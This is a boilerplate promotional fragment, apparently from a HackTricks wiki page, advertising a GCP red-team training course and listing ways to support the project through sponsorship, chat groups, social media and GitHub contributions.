Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
